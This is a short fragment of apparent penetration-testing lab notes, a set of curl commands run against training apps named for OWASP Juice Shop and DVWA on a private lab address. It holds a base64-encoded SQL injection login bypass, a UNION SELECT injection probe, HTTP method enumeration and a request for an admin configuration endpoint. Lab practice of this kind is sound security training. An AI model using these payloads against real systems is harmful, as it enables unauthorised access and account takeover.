...
```bash
# 허용 메서드 열거 + /ftp 정보 노출
curl -s -i -X OPTIONS -H 'Host: juice.el34.lab' http://192.168.0.161/ | grep -iE '^Allow|^HTTP' | head -2
...
echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv8.json; curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv8.json http://192.168.0.161/rest/user/login | head -c 100; rm -f /tmp/wv8.json
```
...
```bash
curl -s -o /dev/null -w 'sqli=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://192.168.0.161/?id=1%27%20UNION%20SELECT%201--\"
...
```bash
curl -s -o /dev/null -w 'admincfg=%{http_code}\n' -H 'Host: juice.el34.lab' http://192.168.0.161/rest/admin/application-configuration
```
